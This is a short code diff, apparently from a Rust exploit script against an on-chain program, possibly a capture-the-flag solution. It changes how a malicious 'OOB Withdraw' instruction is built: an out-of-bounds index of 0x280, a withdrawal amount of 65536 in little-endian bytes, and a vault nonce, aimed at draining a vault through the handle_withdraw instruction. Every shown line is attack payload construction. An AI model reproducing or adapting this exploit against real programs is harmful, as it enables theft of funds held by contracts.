@@ -48,13 +48,16 @@ pub fn process_instruction(
     )?;
 
     // 2. OOB Withdraw
+    // 2. OOB Withdraw
     let mut data = vec![0u8; 16];
     data[0] = 2;          // handle_withdraw instruction code
-    data[4] = 0x80;       // index = 0x280
+    data[4] = 0x80;       // index = 0x280 (little-endian)
     data[5] = 0x02;
-    data[8] = 0x00;       // amount = 0x10000 (65536)
-    data[9] = 0x00;
-    data[10] = 0x01;
+    
+    // amount = 65536 (u32) at data[8..12]
+    data[8..12].copy_from_slice(&(65536u32).to_le_bytes());
+    
+    // vault_nonce at data[12] (exactly as the C code did)
     data[12] = vault_nonce;
 
     let withdraw_ix = Instruction {
